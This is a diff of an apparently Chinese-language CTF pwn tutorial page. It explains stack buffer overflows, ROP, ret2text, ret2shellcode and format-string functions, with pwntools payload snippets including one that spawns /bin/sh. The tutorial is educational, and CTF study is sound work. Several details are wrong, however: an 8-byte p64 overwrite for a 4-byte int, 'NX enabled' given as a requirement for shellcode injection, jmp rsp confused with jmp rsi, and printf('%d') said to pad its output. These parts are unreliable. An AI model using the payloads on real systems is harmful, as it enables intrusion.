@@ -49,7 +49,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2025-05-12T15:01:08.000Z">
-<meta property="article:modified_time" content="2025-12-20T23:58:59.714Z">
+<meta property="article:modified_time" content="2025-12-21T11:01:39.138Z">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2246,7 +2246,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     root: '/',
     debug: "env",
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1766275190064),
+    lastupdate: new Date(1766314922302),
     cdn: {
       izitoast_css: 'https://unpkg.com/izitoast@1.4.0/dist/css/iziToast.min.css',
       izitoast_js: 'https://unpkg.com/izitoast@1.4.0/dist/js/iziToast.min.js',
@@ -2724,7 +2724,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateModified" datetime="2025-12-21T00:58:59+01:00">
+            <div class="new-meta-item date" itemprop="dateModified" datetime="2025-12-21T12:01:39+01:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>Last UpdatedDec 21, 2025</p>
@@ -2963,8 +2963,24 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-ropgadget</span><br></pre></td></tr></table></figure>
 <p><strong>用法</strong>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vuln | grep -E <span class="string">&quot;pop rdi ; ret&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="漏洞以及利用方法"><a href="#漏洞以及利用方法" class="headerlink" title="漏洞以及利用方法"></a><strong>漏洞以及利用方法</strong></h2><h2 id="溢出-Buffer-Overflow"><a href="#溢出-Buffer-Overflow" class="headerlink" title="溢出 Buffer Overflow"></a><strong>溢出 Buffer Overflow</strong></h2><h3 id="漏洞-常见危险函数"><a href="#漏洞-常见危险函数" class="headerlink" title="漏洞/常见危险函数"></a><strong>漏洞/常见危险函数</strong></h3><p><strong>Buffer overflow（缓冲区溢出）漏洞</strong> 常见于<strong>不做边界检查</strong>或<strong>边界检查错误</strong>的输入/拷贝函数；可覆盖栈/堆/静态区中的相邻数据（如返回地址、函数指针、对象元数据等）。</p>
+<h2 id="漏洞以及利用方法"><a href="#漏洞以及利用方法" class="headerlink" title="漏洞以及利用方法"></a><strong>漏洞以及利用方法</strong></h2><p>一般pwn题的核心漏洞主要分为2种：（概况地比较笼统）</p>
 <ul>
+<li>不安全的输入/边界处理（从而导致溢出，格式化字符串漏洞等问题）</li>
+<li>状态/权限/生命周期等逻辑设计或实现错误（比如最普通的Use-After_Free）</li>
+</ul>
+<p>我们需要利用这些漏洞来修改程序的执行流程，从而达到读取flag或者拿到shell的目的。</p>
+<p>下面主要分成3部分来讲：</p>
+<ul>
+<li>溢出（主要关注栈溢出）</li>
+<li>格式化字符串漏洞</li>
+<li>堆利用</li>
+</ul>
+<h2 id="溢出-Buffer-Overflow"><a href="#溢出-Buffer-Overflow" class="headerlink" title="溢出 Buffer Overflow"></a><strong>溢出 Buffer Overflow</strong></h2><p><strong>Buffer overflow（缓冲区溢出）漏洞</strong>常见于<strong>不做边界检查</strong>或<strong>边界检查错误</strong>的输入/拷贝函数；可覆盖栈/堆/静态区中的相邻数据（如返回地址、函数指针、对象元数据等）。</p>
+<p>当然初次之外还有很多溢出的漏洞表现，比如说整数溢出导致的越界写入等。</p>
+<p>而如果溢出是发生在栈上的话，称为<strong>栈溢出</strong>。常见的利用方法是通过溢出修改栈中相邻的内容，如返回地址等。</p>
+<p>（<strong>栈溢出</strong>的定义：指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。）</p>
+<p>比较简单常见的<strong>栈溢出</strong>的例子的就是，程序给某个变量在栈上分配了一个固定大小的内存，但是程度接收输入时没有仔细检查，导致我们可以将超过这个内存大小的内容写入进这个变量，于是它会覆盖其更高地址的内容。</p>
+<h3 id="漏洞-常见危险函数"><a href="#漏洞-常见危险函数" class="headerlink" title="漏洞/常见危险函数"></a><strong>漏洞/常见危险函数</strong></h3><ul>
 <li><p><code>gets()</code></p>
 <ul>
 <li>没有任何输入长度限制/检查。</li>
@@ -2996,51 +3012,715 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </ul>
 </li>
 </ul>
-<p><strong>栈溢出</strong>指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p>
 <h3 id="结构体字段劫持"><a href="#结构体字段劫持" class="headerlink" title="结构体字段劫持"></a><strong>结构体字段劫持</strong></h3><p>最简单的攻击目的便是修改写入变量附近的某个变量的值。比如说在下面这个例子里：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> is_admin;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You are admin!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> <span class="title">u</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;u, <span class="number">0</span>, <span class="keyword">sizeof</span>(u));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">    fgets(u.name, <span class="number">200</span>, <span class="built_in">stdin</span>);  <span class="comment">// name只有64字节，fgets读200字节</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u.is_admin == <span class="number">1</span>) &#123;</span><br><span class="line">        win();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Access denied.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们写入的变量为user这个struct里的name，但是由于输入长度限制为200，而实际的name的存储空间仅为64，并且struct里的内容的存储空间是连续的，所以可以通过输入</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + <span class="string">&#x27;\x01\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 也可以用</span></span><br><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + p32(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p>将原本的<code>is_admin</code>的值修改为（被覆盖掉为）1。（注意大部分架构都是使用的小端序，并且int的大小为4个Byte，所以是<code>\x01\x00\x00\x00</code>）</p>
-<h3 id="ROP（Return-Oriented-Programming）"><a href="#ROP（Return-Oriented-Programming）" class="headerlink" title="ROP（Return Oriented Programming）"></a><strong>ROP（Return Oriented Programming）</strong></h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><strong>ret2text</strong></h4><p><strong>ret2text（Return-to-Text）</strong>即<strong>控制程序执行程序本身已有的的代码</strong> (即， <code>.text</code> 段中的代码) 。</p>
+<p>我们写入的变量为<code>user</code>这个struct里的<code>name</code>，但是由于输入长度限制为200，而实际的<code>name</code>的存储空间仅为64，并且struct里的内容的存储空间是连续的，所以可以通过输入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + <span class="string">&#x27;\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 也可以用</span></span><br><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>将原本的<code>is_admin</code>的值修改为（被覆盖掉为）1。（注意大部分架构都是使用的小端序，并且<code>int</code>的大小为4个Byte，所以是<code>\x01\x00\x00\x00\x00\x00\x00\x00</code>）</p>
+<h3 id="ROP（Return-Oriented-Programming）"><a href="#ROP（Return-Oriented-Programming）" class="headerlink" title="ROP（Return Oriented Programming）"></a><strong>ROP（Return Oriented Programming）</strong></h3><p><strong>ROP（返回导向编程）</strong>指的是我们通过漏洞覆盖返回地址，并在栈上布置一条<strong>返回链（ROP Chain）</strong>，使程序在不断执行<code>ret</code>时依次跳转到一系列以<code>ret</code>结尾的 gadget<strong>，从而把程序/库中已有的指令片段</strong>组合成所需的执行流程（例如调用<code>system</code>、触发<code>syscall</code>、ORW读flag等）。</p>
+<p>因为要覆盖修改返回地址，所以我们需要精确计算我们注入的起始点到返回地址的偏移。</p>
+<p>比如说在这个例子里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|    buf    |	0x20</span><br><span class="line">| saved RBP |	0x08</span><br><span class="line">|	ret     |</span><br></pre></td></tr></table></figure>
+<p>偏移就是<code>0x28</code>。这个偏移很多时候也可以用IDA直接查看栈结构来得到，只不过偶尔IDA的偏移会不准确，这个时候就只能依靠GDB调试来确认。</p>
+<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><strong>ret2text</strong></h4><p><strong>ret2text（Return-to-Text）</strong>即<strong>控制程序执行程序本身已有的的代码</strong> (即， <code>.text</code> 段中的代码) 。</p>
 <p>这种Exploit一般需要：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stack:      No canary found</span><br><span class="line">PIE:        No PIE</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack:      No canary found</span><br></pre></td></tr></table></figure>
 <p>如果开启了PIE，则需要先泄露基址，再计算所需函数的实际地址。</p>
 <p><strong>例子</strong>（假设程序中原本有一个不需要参数的<code>win()</code>函数，它会调用<code>system(&quot;/bin/sh&quot;)</code>。）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win_address = <span class="number">0x0000000000401172</span>	<span class="comment"># win函数地址0x401172</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset          	<span class="comment"># 一路覆盖到返回地址前</span></span><br><span class="line">payload += p64(win_address)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win_address = <span class="number">0x0000000000401172</span>		<span class="comment"># win函数地址0x401172</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset_to_ret_addr     <span class="comment"># 一路覆盖到返回地址前</span></span><br><span class="line">payload += p64(win_address)</span><br></pre></td></tr></table></figure>
 <h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h4><p><strong>ret2shellcode</strong>（<strong>Return-to-Shellcode</strong>）指的是：<br>在利用栈溢出等漏洞时，<strong>将自己编写的shellcode注入到内存（常见是栈/堆/<code>.bss</code>）里</strong>，再通过覆盖返回地址或利用跳转<code>gadget</code>（如 <code>jmp *sp</code>）<strong>把控制流重定向到该shellcode</strong>，从而直接执行任意指令。</p>
+<p>先只关注将shellcode写入stack并执行：</p>
 <p>这种Exploit一般需要：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NX:         NX enabled		<span class="comment">#重中之重</span></span><br><span class="line"></span><br><span class="line">Stack:      No canary found</span><br><span class="line">PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <p>我们分成开启/关闭ASLR的2种情况来讨论。</p>
-<p>1. 开启ASLR：</p>
+<p><strong>1. 开启ASLR：</strong></p>
 <p>最小化示例（x64，NX 关闭；利用 <code>jmp rsp</code> gadget；<code>PIE</code> 关闭）：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())   <span class="comment"># /bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到 jmp rsi 指令地址</span></span><br><span class="line">JMP_RSI = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;jmp rsi&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>:      shellcode,  <span class="comment"># shellcode</span></span><br><span class="line">    <span class="number">256</span>:    JMP_RSI                <span class="comment"># 溢出 return address</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 <p>当程序执行<code>ret</code>时，<code>RIP</code>被改成<code>JMP_RSI</code>，CPU开始执行<code>jmp rsi</code>。这条指令的含义是：跳到<code>RSI</code>指向的地址继续执行。此时<code>RSI</code>里还保留着刚才缓冲区的地址，所以会跳转到缓冲区的开头执行我们放在里面的shellcode。</p>
+<p><strong>2. 关闭ASLR：</strong></p>
+<p>由于关闭了ASLR，所以我们可以在将shellcode写入进stack后直接通过爆破栈地址来执行shellcode。</p>
+<p>只不过普通的爆破需要定位到非常精准的地址，导致爆破效率低下，所以我们可以利用一个叫做<strong>NOP Sled</strong>的方法提高爆破效率。</p>
 <h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><strong>ret2libc</strong></h4><p><strong>ret2libc</strong>（<strong>Return-to-Library</strong>）指的是：<br>在存在栈溢出等漏洞、但<strong>无法直接执行注入的 shellcode</strong>（通常因为 <strong>DEP/NX</strong> 保护禁止在栈上执行代码）的情况下，攻击者将程序的控制流劫持到<code>libc</code>库中的现成函数，比如 <code>system()</code>，从而达到执行任意命令的目的。</p>
 <p>这种通常较为复杂。</p>
-<h3 id="劫持控制流-Control-Flow-Hijack"><a href="#劫持控制流-Control-Flow-Hijack" class="headerlink" title="劫持控制流/Control Flow Hijack"></a><strong>劫持控制流/Control Flow Hijack</strong></h3><h3 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a><strong>Stack Canary</strong></h3><h2 id="格式化字符串漏洞-Format-String-Vulnerability"><a href="#格式化字符串漏洞-Format-String-Vulnerability" class="headerlink" title="格式化字符串漏洞 Format String Vulnerability"></a><strong>格式化字符串漏洞 Format String Vulnerability</strong></h2><p>详见：<a href="https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88Format-String%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">格式化字符串（Format String）漏洞介绍</a></p>
-<p><strong>正常情况</strong>：<br>在进入<code>printf</code>函数之后，函数会首先获取第一个参数，一个一个读取其字符会遇到两种情况：</p>
+<p><strong>SROP</strong></p>
+<h3 id="劫持控制流-Control-Flow-Hijack"><a href="#劫持控制流-Control-Flow-Hijack" class="headerlink" title="劫持控制流/Control Flow Hijack"></a><strong>劫持控制流/Control Flow Hijack</strong></h3><h3 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a><strong>Stack Canary</strong></h3><h2 id="格式化字符串漏洞-Format-String-Vulnerability"><a href="#格式化字符串漏洞-Format-String-Vulnerability" class="headerlink" title="格式化字符串漏洞 Format String Vulnerability"></a><strong>格式化字符串漏洞 Format String Vulnerability</strong></h2><p>我们首先来看一下什么是格式化字符串函数。</p>
+<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a><strong>格式化字符串函数</strong></h3><p>格式化字符串（ format string）函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p>
+<p>可以参考这个定义：</p>
+<p>The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments.</p>
+<p>（来源：<a target="_blank" rel="noopener" href="https://ocaml.org/manual/5.0/api/Printf.html）">https://ocaml.org/manual/5.0/api/Printf.html）</a></p>
+<p>一般来说，格式化字符串在利用的时候主要分为三个部分</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>变量，<strong>可选</strong></li>
+</ul>
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);  <span class="comment">// %d是输出控制符，d 表示十进制，后面的 i 是输出参数*</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="格式化字符串函数-1"><a href="#格式化字符串函数-1" class="headerlink" title="格式化字符串函数"></a><strong>格式化字符串函数</strong></h4><p>分为输入和输出，其中</p>
+<p>- <strong>输入</strong>：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">函数</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>scanf()</code></td>
+<td style="text-align:center">从标准输入读取数据</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>基本语法：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;格式字符串&quot;</span>, &amp;变量<span class="number">1</span>, &amp;变量<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure>
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">	<span class="type">float</span> height;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %f %s&quot;</span>, &amp;age, &amp;height, name);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意：<code>scanf(&quot;%s&quot;, name);</code> 不需要加 <code>&amp;</code>，因为数组名本身就是地址。</p>
+<p>- <strong>输出</strong>：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>printf</code></td>
+<td>向标准输出（通常是终端）打印格式化字符串</td>
+</tr>
+<tr>
+<td><code>fprintf</code></td>
+<td>向指定文件流打印格式化字符串（如 <code>stderr</code>, 文件指针等）</td>
+</tr>
+<tr>
+<td><code>sprintf</code></td>
+<td>将格式化的字符串写入字符数组（注意缓冲区溢出风险）</td>
+</tr>
+<tr>
+<td><code>snprintf</code></td>
+<td>将格式化的字符串写入字符数组，指定最大写入长度，<strong>更安全</strong></td>
+</tr>
+<tr>
+<td><code>asprintf</code></td>
+<td>将格式化字符串写入动态分配的内存（GNU 扩展，非标准 C）</td>
+</tr>
+<tr>
+<td><code>dprintf</code></td>
+<td>向指定的文件描述符写入格式化字符串（POSIX，常用于系统编程）</td>
+</tr>
+<tr>
+<td><code>vprintf</code></td>
+<td>类似 <code>printf</code>，但参数通过 <code>va_list</code> 传递（用于变参函数）</td>
+</tr>
+<tr>
+<td><code>vfprintf</code></td>
+<td>类似 <code>fprintf</code>，参数为 <code>va_list</code></td>
+</tr>
+<tr>
+<td><code>vsprintf</code></td>
+<td>类似 <code>sprintf</code>，参数为 <code>va_list</code>（不安全）</td>
+</tr>
+<tr>
+<td><code>vsnprintf</code></td>
+<td>类似 <code>snprintf</code>，参数为 <code>va_list</code>（推荐用于变参安全格式化）</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a><strong>格式化字符串</strong></h4><p>正如上面的定义里说的，格式化字符串里除了明文还有格式化占位符。我们这里来重点关注一下这个格式化占位符。</p>
+<p><strong>格式化占位符（conversion specifications）</strong>的语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
+<p>- <strong>Parameter</strong>：指定用于格式化的参数位置（从1开始）</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>n$</code></td>
+<td style="text-align:center">其中<code>n</code>是参数位置</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$d %1$d&quot;</span>, <span class="number">11</span>, <span class="number">22</span>);</span><br><span class="line"><span class="comment">// 会输出 22 11</span></span><br></pre></td></tr></table></figure>
+<p>- <strong>Flags</strong>：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">标志</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>-</code></td>
+<td style="text-align:center">左对齐（默认是右对齐）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>+</code></td>
+<td style="text-align:center">总是显示正号或负号（例如 +10）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code> </code>(空格)</td>
+<td style="text-align:center">正数前加空格，负数前加负号</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>0</code></td>
+<td style="text-align:center">用0填充未占满的宽度</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>#</code></td>
+<td style="text-align:center">对于<code>%o</code>、<code>%x</code>、<code>%X</code>等，添加前缀（如<code>0x</code>）；对于<code>%f</code>等，始终包含小数点</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>- <strong>Field Width</strong>：指定最小输出字符数，不足时用空格（或<code>0</code>）填充，如果要使用变量指定宽度，可以用 <code>*</code>。</p>
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="number">42</span>);</span><br><span class="line"><span class="comment">// 会输出 &quot;   42&quot; （前面有3个空格）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%*d&quot;</span>, <span class="number">5</span>, <span class="number">42</span>);</span><br><span class="line"><span class="comment">// 会输出 &quot;   42&quot; （前面有3个空格）</span></span><br></pre></td></tr></table></figure>
+<p>- <strong>Precision</strong>：指定数字小数点后的位数或字符串的最大输出长度：</p>
+<ul>
+<li>对于浮点数（如 <code>%f</code>）：表示小数点后保留的位数，如 <code>%.2f</code></li>
+<li>对于字符串（如 <code>%s</code>）：表示最大输出字符数，如 <code>%.5s</code></li>
+<li>可以使用 <code>*</code> 表示由参数动态提供</li>
+</ul>
+<p>- <strong>Length</strong>：指出浮点型参数或整型参数的长度</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">修饰符</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>hh</code></td>
+<td style="text-align:center"><code>signed char</code> 或 <code>unsigned char</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>h</code></td>
+<td style="text-align:center"><code>short</code> 或 <code>unsigned short</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>l</code></td>
+<td style="text-align:center"><code>long</code> 或 <code>unsigned long</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ll</code></td>
+<td style="text-align:center"><code>long long</code> 或 <code>unsigned long long</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>L</code></td>
+<td style="text-align:center"><code>long double</code>（用于<code>%Lf</code>）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>z</code></td>
+<td style="text-align:center"><code>size_t</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>t</code></td>
+<td style="text-align:center"><code>ptrdiff_t</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>j</code></td>
+<td style="text-align:center"><code>intmax_t</code> 或 <code>uintmax_t</code></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span 